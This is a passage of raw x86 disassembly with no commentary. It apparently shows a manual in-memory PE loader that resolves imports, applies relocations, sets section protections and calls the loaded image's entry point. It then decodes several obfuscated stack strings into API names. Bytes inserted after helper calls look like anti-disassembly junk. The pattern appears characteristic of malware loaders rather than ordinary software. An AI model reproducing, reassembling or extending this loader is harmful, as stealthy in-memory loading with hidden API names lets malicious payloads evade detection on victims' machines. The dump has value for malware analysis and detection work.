 1003f11:	8d 04 c1             	lea    (%ecx,%eax,8),%eax
 1003f14:	8b 48 14             	mov    0x14(%eax),%ecx
 1003f17:	8b 40 0c             	mov    0xc(%eax),%eax
 1003f1a:	03 4d 10             	add    0x10(%ebp),%ecx
 1003f1d:	03 c6                	add    %esi,%eax
 1003f1f:	51                   	push   %ecx
 1003f20:	50                   	push   %eax
 1003f21:	e8 11 fa ff ff       	call   0x1003937
 1003f26:	83 c4 0c             	add    $0xc,%esp
 1003f29:	ff 45 0c             	incl   0xc(%ebp)
 1003f2c:	66 8b 45 0c          	mov    0xc(%ebp),%ax
 1003f30:	66 3b 47 06          	cmp    0x6(%edi),%ax
 1003f34:	72 cd                	jb     0x1003f03
 1003f36:	e8 8b fa ff ff       	call   0x10039c6
 1003f3b:	c7 45 6a 6b 8b 7e 3c 	movl   $0x3c7e8b6b,0x6a(%ebp)
 1003f42:	03 fe                	add    %esi,%edi
 1003f44:	89 bd 78 ff ff ff    	mov    %edi,-0x88(%ebp)
 1003f4a:	8b 87 80 00 00 00    	mov    0x80(%edi),%eax
 1003f50:	3b c3                	cmp    %ebx,%eax
 1003f52:	0f 84 5d 02 00 00    	je     0x10041b5
 1003f58:	03 c6                	add    %esi,%eax
 1003f5a:	89 45 bc             	mov    %eax,-0x44(%ebp)
 1003f5d:	39 58 04             	cmp    %ebx,0x4(%eax)
 1003f60:	75 09                	jne    0x1003f6b
 1003f62:	39 58 0c             	cmp    %ebx,0xc(%eax)
 1003f65:	0f 84 a3 00 00 00    	je     0x100400e
 1003f6b:	8b 78 0c             	mov    0xc(%eax),%edi
 1003f6e:	03 fe                	add    %esi,%edi
 1003f70:	57                   	push   %edi
 1003f71:	ff 95 40 ff ff ff    	call   *-0xc0(%ebp)
 1003f77:	89 45 0c             	mov    %eax,0xc(%ebp)
 1003f7a:	e8 47 fa ff ff       	call   0x10039c6
 1003f7f:	75 5f                	jne    0x1003fe0
 1003f81:	a8 8f                	test   $0x8f,%al
 1003f83:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
 1003f86:	75 12                	jne    0x1003f9a
 1003f88:	57                   	push   %edi
 1003f89:	ff 95 48 ff ff ff    	call   *-0xb8(%ebp)
 1003f8f:	3b c3                	cmp    %ebx,%eax
 1003f91:	89 45 0c             	mov    %eax,0xc(%ebp)
 1003f94:	0f 84 1b 02 00 00    	je     0x10041b5
 1003f9a:	8b 45 bc             	mov    -0x44(%ebp),%eax
 1003f9d:	8b 48 10             	mov    0x10(%eax),%ecx
 1003fa0:	8b 00                	mov    (%eax),%eax
 1003fa2:	3b c3                	cmp    %ebx,%eax
 1003fa4:	8d 3c 31             	lea    (%ecx,%esi,1),%edi
 1003fa7:	75 05                	jne    0x1003fae
 1003fa9:	89 7d 10             	mov    %edi,0x10(%ebp)
 1003fac:	eb 05                	jmp    0x1003fb3
 1003fae:	03 c6                	add    %esi,%eax
 1003fb0:	89 45 10             	mov    %eax,0x10(%ebp)
 1003fb3:	e8 0e fa ff ff       	call   0x10039c6
 1003fb8:	c8 6d 8e 4e          	enter  $0x8e6d,$0x4e
 1003fbc:	8b 45 10             	mov    0x10(%ebp),%eax
 1003fbf:	8b 00                	mov    (%eax),%eax
 1003fc1:	3b c3                	cmp    %ebx,%eax
 1003fc3:	74 37                	je     0x1003ffc
 1003fc5:	a9 00 00 00 80       	test   $0x80000000,%eax
 1003fca:	8d 0c 30             	lea    (%eax,%esi,1),%ecx
 1003fcd:	74 08                	je     0x1003fd7
 1003fcf:	25 ff ff 00 00       	and    $0xffff,%eax
 1003fd4:	50                   	push   %eax
 1003fd5:	eb 04                	jmp    0x1003fdb
 1003fd7:	83 c1 02             	add    $0x2,%ecx
 1003fda:	51                   	push   %ecx
 1003fdb:	ff 75 0c             	push   0xc(%ebp)
 1003fde:	ff 75 08             	push   0x8(%ebp)
 1003fe1:	e8 a5 f9 ff ff       	call   0x100398b
 1003fe6:	83 c4 0c             	add    $0xc,%esp
 1003fe9:	3b fb                	cmp    %ebx,%edi
 1003feb:	89 07                	mov    %eax,(%edi)
 1003fed:	0f 84 c2 01 00 00    	je     0x10041b5
 1003ff3:	83 c7 04             	add    $0x4,%edi
 1003ff6:	83 45 10 04          	addl   $0x4,0x10(%ebp)
 1003ffa:	eb c0                	jmp    0x1003fbc
 1003ffc:	83 45 bc 14          	addl   $0x14,-0x44(%ebp)
 1004000:	8b bd 78 ff ff ff    	mov    -0x88(%ebp),%edi
 1004006:	8b 45 bc             	mov    -0x44(%ebp),%eax
 1004009:	e9 4f ff ff ff       	jmp    0x1003f5d
 100400e:	e8 b3 f9 ff ff       	call   0x10039c6
 1004013:	6f                   	outsl  %ds:(%esi),(%dx)
 1004014:	d4 c8                	aam    $0xc8
 1004016:	be 8b 87 a0 00       	mov    $0xa0878b,%esi
 100401b:	00 00                	add    %al,(%eax)
 100401d:	3b c3                	cmp    %ebx,%eax
 100401f:	74 59                	je     0x100407a
 1004021:	03 c6                	add    %esi,%eax
 1004023:	39 18                	cmp    %ebx,(%eax)
 1004025:	74 53                	je     0x100407a
 1004027:	8b 50 04             	mov    0x4(%eax),%edx
 100402a:	8d 48 08             	lea    0x8(%eax),%ecx
 100402d:	03 d0                	add    %eax,%edx
 100402f:	89 4d 08             	mov    %ecx,0x8(%ebp)
 1004032:	3b ca                	cmp    %edx,%ecx
 1004034:	73 3f                	jae    0x1004075
 1004036:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1004039:	0f b7 09             	movzwl (%ecx),%ecx
 100403c:	8b d1                	mov    %ecx,%edx
 100403e:	81 e2 00 f0 00 00    	and    $0xf000,%edx
 1004044:	81 fa 00 30 00 00    	cmp    $0x3000,%edx
 100404a:	75 13                	jne    0x100405f
 100404c:	81 e1 ff 0f 00 00    	and    $0xfff,%ecx
 1004052:	8b d6                	mov    %esi,%edx
 1004054:	2b 57 34             	sub    0x34(%edi),%edx
 1004057:	03 ce                	add    %esi,%ecx
 1004059:	03 08                	add    (%eax),%ecx
 100405b:	01 11                	add    %edx,(%ecx)
 100405d:	eb 08                	jmp    0x1004067
 100405f:	3b d3                	cmp    %ebx,%edx
 1004061:	0f 85 4e 01 00 00    	jne    0x10041b5
 1004067:	8b 48 04             	mov    0x4(%eax),%ecx
 100406a:	83 45 08 02          	addl   $0x2,0x8(%ebp)
 100406e:	03 c8                	add    %eax,%ecx
 1004070:	39 4d 08             	cmp    %ecx,0x8(%ebp)
 1004073:	72 c1                	jb     0x1004036
 1004075:	03 40 04             	add    0x4(%eax),%eax
 1004078:	eb a9                	jmp    0x1004023
 100407a:	89 5d 0c             	mov    %ebx,0xc(%ebp)
 100407d:	eb 06                	jmp    0x1004085
 100407f:	8b bd 78 ff ff ff    	mov    -0x88(%ebp),%edi
 1004085:	8b 45 0c             	mov    0xc(%ebp),%eax
 1004088:	66 3b 47 06          	cmp    0x6(%edi),%ax
 100408c:	75 0f                	jne    0x100409d
 100408e:	8b 95 4c ff ff ff    	mov    -0xb4(%ebp),%edx
 1004094:	33 c9                	xor    %ecx,%ecx
 1004096:	bf 00 00 00 60       	mov    $0x60000000,%edi
 100409b:	eb 1e                	jmp    0x10040bb
 100409d:	0f b7 c0             	movzwl %ax,%eax
 10040a0:	8d 04 80             	lea    (%eax,%eax,4),%eax
 10040a3:	8b 8c c7 04 01 00 00 	mov    0x104(%edi,%eax,8),%ecx
 10040aa:	8b 94 c7 08 01 00 00 	mov    0x108(%edi,%eax,8),%edx
 10040b1:	8d 84 c7 f8 00 00 00 	lea    0xf8(%edi,%eax,8),%eax
 10040b8:	8b 78 24             	mov    0x24(%eax),%edi
 10040bb:	8d 44 0a ff          	lea    -0x1(%edx,%ecx,1),%eax
 10040bf:	33 d2                	xor    %edx,%edx
 10040c1:	f7 b5 54 ff ff ff    	divl   -0xac(%ebp)
 10040c7:	33 d2                	xor    %edx,%edx
 10040c9:	89 45 bc             	mov    %eax,-0x44(%ebp)
 10040cc:	8b c1                	mov    %ecx,%eax
 10040ce:	f7 b5 54 ff ff ff    	divl   -0xac(%ebp)
 10040d4:	3b 45 bc             	cmp    -0x44(%ebp),%eax
 10040d7:	77 40                	ja     0x1004119
 10040d9:	8b d7                	mov    %edi,%edx
 10040db:	89 7d 08             	mov    %edi,0x8(%ebp)
 10040de:	81 65 08 00 00 00 40 	andl   $0x40000000,0x8(%ebp)
 10040e5:	89 7d 10             	mov    %edi,0x10(%ebp)
 10040e8:	81 e2 00 00 00 20    	and    $0x20000000,%edx
 10040ee:	81 65 10 00 00 00 80 	andl   $0x80000000,0x10(%ebp)
 10040f5:	8b 4d 18             	mov    0x18(%ebp),%ecx
 10040f8:	3b d3                	cmp    %ebx,%edx
 10040fa:	74 04                	je     0x1004100
 10040fc:	80 0c 08 01          	orb    $0x1,(%eax,%ecx,1)
 1004100:	39 5d 08             	cmp    %ebx,0x8(%ebp)
 1004103:	74 04                	je     0x1004109
 1004105:	80 0c 08 02          	orb    $0x2,(%eax,%ecx,1)
 1004109:	39 5d 10             	cmp    %ebx,0x10(%ebp)
 100410c:	74 05                	je     0x1004113
 100410e:	03 c8                	add    %eax,%ecx
 1004110:	80 09 04             	orb    $0x4,(%ecx)
 1004113:	40                   	inc    %eax
 1004114:	3b 45 bc             	cmp    -0x44(%ebp),%eax
 1004117:	76 dc                	jbe    0x10040f5
 1004119:	ff 45 0c             	incl   0xc(%ebp)
 100411c:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
 1004122:	66 8b 4d 0c          	mov    0xc(%ebp),%cx
 1004126:	66 3b 48 06          	cmp    0x6(%eax),%cx
 100412a:	0f 86 4f ff ff ff    	jbe    0x100407f
 1004130:	89 75 08             	mov    %esi,0x8(%ebp)
 1004133:	33 ff                	xor    %edi,%edi
 1004135:	8b 45 18             	mov    0x18(%ebp),%eax
 1004138:	6a 02                	push   $0x2
 100413a:	59                   	pop    %ecx
 100413b:	0f b6 04 07          	movzbl (%edi,%eax,1),%eax
 100413f:	2b c1                	sub    %ecx,%eax
 1004141:	74 23                	je     0x1004166
 1004143:	48                   	dec    %eax
 1004144:	74 17                	je     0x100415d
 1004146:	83 e8 03             	sub    $0x3,%eax
 1004149:	74 09                	je     0x1004154
 100414b:	c7 45 fc 40 00 00 00 	movl   $0x40,-0x4(%ebp)
 1004152:	eb 2f                	jmp    0x1004183
 1004154:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
 100415b:	eb 0c                	jmp    0x1004169
 100415d:	c7 45 fc 20 00 00 00 	movl   $0x20,-0x4(%ebp)
 1004164:	eb 03                	jmp    0x1004169
 1004166:	89 4d fc             	mov    %ecx,-0x4(%ebp)
 1004169:	8d 45 fc             	lea    -0x4(%ebp),%eax
 100416c:	50                   	push   %eax
 100416d:	ff 75 fc             	push   -0x4(%ebp)
 1004170:	ff b5 54 ff ff ff    	push   -0xac(%ebp)
 1004176:	ff 75 08             	push   0x8(%ebp)
 1004179:	ff 95 44 ff ff ff    	call   *-0xbc(%ebp)
 100417f:	85 c0                	test   %eax,%eax
 1004181:	74 32                	je     0x10041b5
 1004183:	8b 85 54 ff ff ff    	mov    -0xac(%ebp),%eax
 1004189:	01 45 08             	add    %eax,0x8(%ebp)
 100418c:	47                   	inc    %edi
 100418d:	3b bd 74 ff ff ff    	cmp    -0x8c(%ebp),%edi
 1004193:	76 a0                	jbe    0x1004135
 1004195:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
 100419b:	8b 78 28             	mov    0x28(%eax),%edi
 100419e:	03 fe                	add    %esi,%edi
 10041a0:	e8 21 f8 ff ff       	call   0x10039c6
 10041a5:	f1                   	int1
 10041a6:	c6                   	(bad)
 10041a7:	31 d0                	xor    %edx,%eax
 10041a9:	ff 75 14             	push   0x14(%ebp)
 10041ac:	6a 01                	push   $0x1
 10041ae:	56                   	push   %esi
 10041af:	ff d7                	call   *%edi
 10041b1:	8b c6                	mov    %esi,%eax
 10041b3:	eb 0c                	jmp    0x10041c1
 10041b5:	68 00 80 00 00       	push   $0x8000
 10041ba:	53                   	push   %ebx
 10041bb:	56                   	push   %esi
 10041bc:	ff 55 f8             	call   *-0x8(%ebp)
 10041bf:	33 c0                	xor    %eax,%eax
 10041c1:	5f                   	pop    %edi
 10041c2:	5e                   	pop    %esi
 10041c3:	5b                   	pop    %ebx
 10041c4:	c9                   	leave
 10041c5:	c3                   	ret
 10041c6:	55                   	push   %ebp
 10041c7:	8b ec                	mov    %esp,%ebp
 10041c9:	81 ec ec 07 00 00    	sub    $0x7ec,%esp
 10041cf:	53                   	push   %ebx
 10041d0:	56                   	push   %esi
 10041d1:	57                   	push   %edi
 10041d2:	e8 cd f7 ff ff       	call   0x10039a4
 10041d7:	c3                   	ret
 10041d8:	f8                   	clc
 10041d9:	80 a5 ac fc ff ff 00 	andb   $0x0,-0x354(%ebp)
 10041e0:	80 a5 ad fc ff ff 00 	andb   $0x0,-0x353(%ebp)
 10041e7:	c6 85 ae fc ff ff da 	movb   $0xda,-0x352(%ebp)
 10041ee:	80 a5 af fc ff ff 00 	andb   $0x0,-0x351(%ebp)
 10041f5:	c6 85 b0 fc ff ff 62 	movb   $0x62,-0x350(%ebp)
 10041fc:	c6 85 b1 fc ff ff 40 	movb   $0x40,-0x34f(%ebp)
 1004203:	c6 85 b2 fc ff ff 51 	movb   $0x51,-0x34e(%ebp)
 100420a:	c6 85 b3 fc ff ff 75 	movb   $0x75,-0x34d(%ebp)
 1004211:	c6 85 b4 fc ff ff 57 	movb   $0x57,-0x34c(%ebp)
 1004218:	c6 85 b5 fc ff ff 4a 	movb   $0x4a,-0x34b(%ebp)
 100421f:	c6 85 b6 fc ff ff 46 	movb   $0x46,-0x34a(%ebp)
 1004226:	c6 85 b7 fc ff ff 40 	movb   $0x40,-0x349(%ebp)
 100422d:	c6 85 b8 fc ff ff 56 	movb   $0x56,-0x348(%ebp)
 1004234:	c6 85 b9 fc ff ff 56 	movb   $0x56,-0x347(%ebp)
 100423b:	c6 85 ba fc ff ff 6d 	movb   $0x6d,-0x346(%ebp)
 1004242:	c6 85 bb fc ff ff 40 	movb   $0x40,-0x345(%ebp)
 1004249:	c6 85 bc fc ff ff 44 	movb   $0x44,-0x344(%ebp)
 1004250:	c6 85 bd fc ff ff 55 	movb   $0x55,-0x343(%ebp)
 1004257:	c6 85 be fc ff ff 25 	movb   $0x25,-0x342(%ebp)
 100425e:	8d 85 ac fc ff ff    	lea    -0x354(%ebp),%eax
 1004264:	50                   	push   %eax
 1004265:	e8 6c f7 ff ff       	call   0x10039d6
 100426a:	59                   	pop    %ecx
 100426b:	50                   	push   %eax
 100426c:	ff 75 18             	push   0x18(%ebp)
 100426f:	ff 75 14             	push   0x14(%ebp)
 1004272:	e8 14 f7 ff ff       	call   0x100398b
 1004277:	83 c4 0c             	add    $0xc,%esp
 100427a:	89 85 74 f9 ff ff    	mov    %eax,-0x68c(%ebp)
 1004280:	ff 95 74 f9 ff ff    	call   *-0x68c(%ebp)
 1004286:	89 85 8c f9 ff ff    	mov    %eax,-0x674(%ebp)
 100428c:	c7 85 7c fc ff ff 04 	movl   $0x4,-0x384(%ebp)
 1004293:	00 00 00 
 1004296:	80 a5 cc fc ff ff 00 	andb   $0x0,-0x334(%ebp)
 100429d:	6a 40                	push   $0x40
 100429f:	59                   	pop    %ecx
 10042a0:	33 c0                	xor    %eax,%eax
 10042a2:	8d bd cd fc ff ff    	lea    -0x333(%ebp),%edi
 10042a8:	f3 ab                	rep stos %eax,%es:(%edi)
 10042aa:	66 ab                	stos   %ax,%es:(%edi)
 10042ac:	aa                   	stos   %al,%es:(%edi)
 10042ad:	c7 85 90 f9 ff ff 04 	movl   $0x4,-0x670(%ebp)
 10042b4:	00 00 00 
 10042b7:	80 a5 3c fc ff ff 00 	andb   $0x0,-0x3c4(%ebp)
 10042be:	80 a5 3d fc ff ff 00 	andb   $0x0,-0x3c3(%ebp)
 10042c5:	c6 85 3e fc ff ff 99 	movb   $0x99,-0x3c2(%ebp)
 10042cc:	80 a5 3f fc ff ff 00 	andb   $0x0,-0x3c1(%ebp)
 10042d3:	c6 85 40 fc ff ff 21 	movb   $0x21,-0x3c0(%ebp)
 10042da:	c6 85 41 fc ff ff 03 	movb   $0x3,-0x3bf(%ebp)
 10042e1:	c6 85 42 fc ff ff 12 	movb   $0x12,-0x3be(%ebp)
 10042e8:	c6 85 43 fc ff ff 2b 	movb   $0x2b,-0x3bd(%ebp)
 10042ef:	c6 85 44 fc ff ff 09 	movb   $0x9,-0x3bc(%ebp)
 10042f6:	c6 85 45 fc ff ff 02 	movb   $0x2,-0x3bb(%ebp)
 10042fd:	c6 85 46 fc ff ff 13 	movb   $0x13,-0x3ba(%ebp)
 1004304:	c6 85 47 fc ff ff 0a 	movb   $0xa,-0x3b9(%ebp)
 100430b:	c6 85 48 fc ff ff 03 	movb   $0x3,-0x3b8(%ebp)
 1004312:	c6 85 49 fc ff ff 20 	movb   $0x20,-0x3b7(%ebp)
 1004319:	c6 85 4a fc ff ff 0f 	movb   $0xf,-0x3b6(%ebp)
 1004320:	c6 85 4b fc ff ff 0a 	movb   $0xa,-0x3b5(%ebp)
 1004327:	c6 85 4c fc ff ff 03 	movb   $0x3,-0x3b4(%ebp)
 100432e:	c6 85 4d fc ff ff 28 	movb   $0x28,-0x3b3(%ebp)
 1004335:	c6 85 4e fc ff ff 07 	movb   $0x7,-0x3b2(%ebp)
 100433c:	c6 85 4f fc ff ff 0b 	movb   $0xb,-0x3b1(%ebp)
 1004343:	c6 85 50 fc ff ff 03 	movb   $0x3,-0x3b0(%ebp)
 100434a:	c6 85 51 fc ff ff 27 	movb   $0x27,-0x3af(%ebp)
 1004351:	c6 85 52 fc ff ff 66 	movb   $0x66,-0x3ae(%ebp)
 1004358:	8d 85 3c fc ff ff    	lea    -0x3c4(%ebp),%eax
 100435e:	50                   	push   %eax
 100435f:	e8 72 f6 ff ff       	call   0x10039d6
 1004364:	59                   	pop    %ecx
 1004365:	50                   	push   %eax
 1004366:	ff 75 18             	push   0x18(%ebp)
 1004369:	ff 75 14             	push   0x14(%ebp)
 100436c:	e8 1a f6 ff ff       	call   0x100398b
 1004371:	83 c4 0c             	add    $0xc,%esp
 1004374:	89 85 c8 fa ff ff    	mov    %eax,-0x538(%ebp)
 100437a:	80 a5 14 fc ff ff 00 	andb   $0x0,-0x3ec(%ebp)
 1004381:	80 a5 15 fc ff ff 00 	andb   $0x0,-0x3eb(%ebp)
 1004388:	c6 85 16 fc ff ff 11 	movb   $0x11,-0x3ea(%ebp)
 100438f:	80 a5 17 fc ff ff 00 	andb   $0x0,-0x3e9(%ebp)
 1004396:	c6 85 18 fc ff ff a9 	movb   $0xa9,-0x3e8(%ebp)
 100439d:	c6 85 19 fc ff ff 8b 	movb   $0x8b,-0x3e7(%ebp)
 10043a4:	c6 85 1a fc ff ff 9a 	movb   $0x9a,-0x3e6(%ebp)
 10043ab:	c6 85 1b fc ff ff a3 	movb   $0xa3,-0x3e5(%ebp)
 10043b2:	c6 85 1c fc ff ff 81 	movb   $0x81,-0x3e4(%ebp)
 10043b9:	c6 85 1d fc ff ff 8a 	movb   $0x8a,-0x3e3(%ebp)
 10043c0:	c6 85 1e fc ff ff 9b 	movb   $0x9b,-0x3e2(%ebp)
 10043c7:	c6 85 1f fc ff ff 82 	movb   $0x82,-0x3e1(%ebp)
 10043ce:	c6 85 20 fc ff ff 8b 	movb   $0x8b,-0x3e0(%ebp)
 10043d5:	c6 85 21 fc ff ff a6 	movb   $0xa6,-0x3df(%ebp)
 10043dc:	c6 85 22 fc ff ff 8f 	movb   $0x8f,-0x3de(%ebp)
 10043e3:	c6 85 23 fc ff ff 80 	movb   $0x80,-0x3dd(%ebp)
 10043ea:	c6 85 24 fc ff ff 8a 	movb   $0x8a,-0x3dc(%ebp)
 10043f1:	c6 85 25 fc ff ff 82 	movb   $0x82,-0x3db(%ebp)
 10043f8:	c6 85 26 fc ff ff 8b 	movb   $0x8b,-0x3da(%ebp)
 10043ff:	c6 85 27 fc ff ff af 	movb   $0xaf,-0x3d9(%ebp)
 1004406:	c6 85 28 fc ff ff ee 	movb   $0xee,-0x3d8(%ebp)
 100440d:	8d 85 14 fc ff ff    	lea    -0x3ec(%ebp),%eax
 1004413:	50                   	push   %eax
 1004414:	e8 bd f5 ff ff       	call   0x10039d6
 1004419:	59                   	pop    %ecx
 100441a:	50                   	push   %eax
 100441b:	ff 75 18             	push   0x18(%ebp)
 100441e:	ff 75 14             	push   0x14(%ebp)
 1004421:	e8 65 f5 ff ff       	call   0x100398b
 1004426:	83 c4 0c             	add    $0xc,%esp
 1004429:	89 85 c0 fc ff ff    	mov    %eax,-0x340(%ebp)
 100442f:	e8 92 f5 ff ff       	call   0x10039c6
 1004434:	46                   	inc    %esi
 1004435:	c5 c5 34             	(bad)
 1004438:	80 a5 cc fa ff ff 00 	andb   $0x0,-0x534(%ebp)
 100443f:	80 a5 cd fa ff ff 00 	andb   $0x0,-0x533(%ebp)
 1004446:	c6 85 ce fa ff ff 68 	movb   $0x68,-0x532(%ebp)
 100444d:	80 a5 cf fa ff ff 00 	andb   $0x0,-0x531(%ebp)
 1004454:	c6 85 d0 fa ff ff d4 	movb   $0xd4,-0x530(%ebp)
 100445b:	c6 85 d1 fa ff ff fb 	movb   $0xfb,-0x52f(%ebp)
 1004462:	c6 85 d2 fa ff ff f8 	movb   $0xf8,-0x52e(%ebp)
 1004469:	c6 85 d3 fa ff ff e4 	movb   $0xe4,-0x52d(%ebp)
 1004470:	c6 85 d4 fa ff ff f2 	movb   $0xf2,-0x52c(%ebp)
 1004477:	c6 85 d5 fa ff ff df 	movb   $0xdf,-0x52b(%ebp)
 100447e:	c6 85 d6 fa ff ff f6 	movb   $0xf6,-0x52a(%ebp)
 1004485:	c6 85 d7 fa ff ff f9 	movb   $0xf9,-0x529(%ebp)
 100448c:	c6 85 d8 fa ff ff f3 	movb   $0xf3,-0x528(%ebp)
 1004493:	c6 85 d9 fa ff ff fb 	movb   $0xfb,-0x527(%ebp)
 100449a:	c6 85 da fa ff ff f2 	movb   $0xf2,-0x526(%ebp)
 10044a1:	c6 85 db fa ff ff 97 	movb   $0x97,-0x525(%ebp)
 10044a8:	8d 85 cc fa ff ff    	lea    -0x534(%ebp),%eax
 10044ae:	50                   	push   %eax
 10044af:	e8 22 f5 ff ff       	call   0x10039d6
 10044b4:	59                   	pop    %ecx
 10044b5:	50                   	push   %eax
 10044b6:	ff 75 18             	push   0x18(%ebp)
 10044b9:	ff 75 14             	push   0x14(%ebp)
 10044bc:	e8 ca f4 ff ff       	call   0x100398b
 10044c1:	83 c4 0c             	add    $0xc,%esp
 10044c4:	89 85 80 f9 ff ff    	mov    %eax,-0x680(%ebp)
 10044ca:	e8 f7 f4 ff ff       	call   0x10039c6
 10044cf:	33 5e 19             	xor    0x19(%esi),%ebx
 10044d2:	ce                   	into
 10044d3:	80 a5 9c f9 ff ff 00 	andb   $0x0,-0x664(%ebp)
 10044da:	80 a5 9d f9 ff ff 00 	andb   $0x0,-0x663(%ebp)
 10044e1:	c6 85 9e f9 ff ff 07 	movb   $0x7,-0x662(%ebp)
 10044e8:	80 a5 9f f9 ff ff 00 	andb   $0x0,-0x661(%ebp)
 10044ef:	c6 85 a0 f9 ff ff b0 	movb   $0xb0,-0x660(%ebp)
 10044f6:	c6 85 a1 f9 ff ff 9d 	movb   $0x9d,-0x65f(%ebp)
 10044fd:	c6 85 a2 f9 ff ff 99 	movb   $0x99,-0x65e(%ebp)
 1004504:	c6 85 a3 f9 ff ff 88 	movb   $0x88,-0x65d(%ebp)
 100450b:	c6 85 a4 f9 ff ff b9 	movb   $0xb9,-0x65c(%ebp)
 1004512:	c6 85 a5 f9 ff ff 94 	movb   $0x94,-0x65b(%ebp)
 1004519:	c6 85 a6 f9 ff ff 94 	movb   $0x94,-0x65a(%ebp)
 1004520:	c6 85 a7 f9 ff ff 97 	movb   $0x97,-0x659(%ebp)
 1004527:	c6 85 a8 f9 ff ff 9b 	movb   $0x9b,-0x658(%ebp)
 100452e:	c6 85 a9 f9 ff ff f8 	movb   $0xf8,-0x657(%ebp)
 1004535:	8d 85 9c f9 ff ff    	lea    -0x664(%ebp),%eax
 100453b:	50                   	push   %eax
 100453c:	e8 95 f4 ff ff       	call   0x10039d6
 1004541:	59                   	pop    %ecx
 1004542:	50                   	push   %eax
 1004543:	ff 75 18             	push   0x18(%ebp)
 1004546:	ff 75 14             	push   0x14(%ebp)
 1004549:	e8 3d f4 ff ff       	call   0x100398b
 100454e:	83 c4 0c             	add    $0xc,%esp
 1004551:	89 85 84 f9 ff ff    	mov    %eax,-0x67c(%ebp)
 1004557:	80 a5 dc fa ff ff 00 	andb   $0x0,-0x524(%ebp)
 100455e:	80 a5 dd fa ff ff 00 	andb   $0x0,-0x523(%ebp)
 1004565:	c6 85 de fa ff ff 15 	movb   $0x15,-0x522(%ebp)
 100456c:	80 a5 df fa ff ff 00 	andb   $0x0,-0x521(%ebp)
 1004573:	c6 85 e0 fa ff ff a2 	movb   $0xa2,-0x520(%ebp)
 100457a:	c6 85 e1 fa ff ff 8f 	movb   $0x8f,-0x51f(%ebp)
 1004581:	c6 85 e2 fa ff ff 8b 	movb   $0x8b,-0x51e(%ebp)
 1004588:	c6 85 e3 fa ff ff 9a 	movb   $0x9a,-0x51d(%ebp)
 100458f:	c6 85 e4 fa ff ff ac 	movb   $0xac,-0x51c(%ebp)
 1004596:	c6 85 e5 fa ff ff 98 	movb   $0x98,-0x51b(%ebp)
 100459d:	c6 85 e6 fa ff ff 8f 	movb   $0x8f,-0x51a(%ebp)
 10045a4:	c6 85 e7 fa ff ff 8f 	movb   $0x8f,-0x519(%ebp)
 10045ab:	c6 85 e8 fa ff ff ea 	movb   $0xea,-0x518(%ebp)
 10045b2:	8d 85 dc fa ff ff    	lea    -0x524(%ebp),%eax
 10045b8:	50                   	push   %eax
 10045b9:	e8 18 f4 ff ff       	call   0x10039d6
 10045be:	59                   	pop    %ecx
 10045bf:	50                   	push   %eax
 10045c0:	ff 75 18             	push   0x18(%ebp)
 10045c3:	ff 75 14             	push   0x14(%ebp)
 10045c6:	e8 c0 f3 ff ff       	call   0x100398b
 10045cb:	83 c4 0c             	add    $0xc,%esp
 10045ce:	89 85 64 fc ff ff    	mov    %eax,-0x39c(%ebp)
 10045d4:	e8 ed f3 ff ff       	call   0x10039c6
 10045d9:	60                   	pusha
 10045da:	2a ce                	sub    %dh,%cl
 10045dc:	1c 80                	sbb    $0x80,%al
 10045de:	a5                   	movsl  %ds:(%esi),%es:(%edi)
 10045df:	ec                   	in     (%dx),%al
 10045e0:	fa                   	cli
 10045e1:	ff                   	(bad)
 10045e2:	ff 00                	incl   (%eax)
 10045e4:	80 a5 ed fa ff ff 00 	andb   $0x0,-0x513(%ebp)
 10045eb:	c6 85 ee fa ff ff e3 	movb   $0xe3,-0x512(%ebp)
 10045f2:	80 a5 ef fa ff ff 00 	andb   $0x0,-0x511(%ebp)
 10045f9:	c6 85 f0 fa ff ff 5b 	movb   $0x5b,-0x510(%ebp)
 1004600:	c6 85 f1 fa ff ff 79 	movb   $0x79,-0x50f(%ebp)
 1004607:	c6 85 f2 fa ff ff 68 	movb   $0x68,-0x50e(%ebp)
 100460e:	c6 85 f3 fa ff ff 5a 	movb   $0x5a,-0x50d(%ebp)
 1004615:	c6 85 f4 fa ff ff 75 	movb   $0x75,-0x50c(%ebp)
 100461c:	c6 85 f5 fa ff ff 70 	movb   $0x70,-0x50b(%ebp)
 1004623:	c6 85 f6 fa ff ff 79 	movb   $0x79,-0x50a(%ebp)
 100462a:	c6 85 f7 fa ff ff 4f 	movb   $0x4f,-0x509(%ebp)
 1004631:	c6 85 f8 fa ff ff 75 	movb   $0x75,-0x508(%ebp)
 1004638:	c6 85 f9 fa ff ff 66 	movb   $0x66,-0x507(%ebp)
 100463f:	c6 85 fa fa ff ff 79 	movb   $0x79,-0x506(%ebp)
 1004646:	c6 85 fb fa ff ff 1c 	movb   $0x1c,-0x505(%ebp)
 100464d:	8d 85 ec fa ff ff    	lea    -0x514(%ebp),%eax
 1004653:	50                   	push   %eax
 1004654:	e8 7d f3 ff ff       	call   0x10039d6
 1004659:	59                   	pop    %ecx
 100465a:	50                   	push   %eax
 100465b:	ff 75 18             	push   0x18(%ebp)
 100465e:	ff 75 14             	push   0x14(%ebp)
 1004661:	e8 25 f3 ff ff       	call   0x100398b
 1004666:	83 c4 0c             	add    $0xc,%esp
 1004669:	89 85 c4 fc ff ff    	mov    %eax,-0x33c(%ebp)
 100466f:	e8 52 f3 ff ff       	call   0x10039c6
 1004674:	e5 8e                	in     $0x8e,%eax
 1004676:	7c e1                	jl     0x1004659
 1004678:	68 04 01 00 00       	push   $0x104
 100467d:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
 1004683:	50                   	push   %eax
 1004684:	ff 75 08             	push   0x8(%ebp)
 1004687:	ff 95 c8 fa ff ff    	call   *-0x538(%ebp)
 100468d:	89 85 68 fc ff ff    	mov    %eax,-0x398(%ebp)
 1004693:	c6 85 bc fa ff ff 01 	movb   $0x1,-0x544(%ebp)
 100469a:	83 bd 68 fc ff ff 00 	cmpl   $0x0,-0x398(%ebp)
 10046a1:	74 17                	je     0x10046ba
 10046a3:	83 bd 68 fc ff ff 00 	cmpl   $0x0,-0x398(%ebp)
 10046aa:	0f 84 d4 01 00 00    	je     0x1004884
 10046b0:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
 10046b4:	0f 84 ca 01 00 00    	je     0x1004884
 10046ba:	83 7d 0c 08          	cmpl   $0x8,0xc(%ebp)
 10046be:	0f 85 88 01 00 00    	jne    0x100484c
